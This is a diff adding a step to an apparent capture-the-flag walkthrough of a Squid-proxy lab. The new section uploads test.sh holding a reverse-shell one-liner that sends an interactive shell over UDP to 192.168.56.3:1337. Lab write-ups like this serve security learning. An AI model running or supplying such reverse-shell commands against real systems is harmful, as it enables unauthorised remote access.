@@ -72,3 +72,11 @@ Let’s use the extension to connect to the Squid http proxy by entering in the 
 - Back under the Files tab, it seems we can change file permissions!
 
   ![img](https://i.ibb.co/ThmPYTz/Screenshot-3.png)
+-----------------------------------------
+
+# 6. Creating a Reverse Shell
+
+- Using a shell will allow us to navigate more efficiently. So we can upload a file named test.sh with this script in the body:
+  ```bash
+  sh -i >& /dev/udp/192.168.56.3/1337 0>&1
+  ```
